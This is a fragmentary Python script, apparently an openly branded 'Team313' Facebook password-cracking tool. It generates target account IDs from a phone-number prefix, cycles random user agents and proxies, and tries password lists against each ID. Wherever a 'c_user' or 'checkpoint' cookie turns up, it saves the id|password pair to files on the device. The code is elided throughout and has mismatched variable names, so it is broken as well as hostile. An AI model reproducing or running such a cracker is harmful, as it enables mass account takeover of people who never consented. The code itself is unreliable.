...
for xd in range(5000):
	...
	ugen.append(uaku2)
try:
	prox= requests.get('https://github.com/SAKING69/.SAKING-proxy.txt').text
...
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : TAEM314
\033[97;1m>>     Facebook : hecking team313
\033[97;1m>>     Version  : 0.5
\033[97;1m>>     Git hop  : keramatafg
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> SAKING  VERSION :\x1b[1;92m 1.1 ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Team313] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[Team313-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/Team313-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SAKING:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Team313-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Team313-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Team313] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[Team-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Team313-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Team313-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE : 88017,88019,88018,9377,.ETC')
	linex()
	kode = input('[+]\x1b[97;1m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mTeam313\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Team313-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Team313-OK] '+uid+' | '+ps+'\33[0;97m')
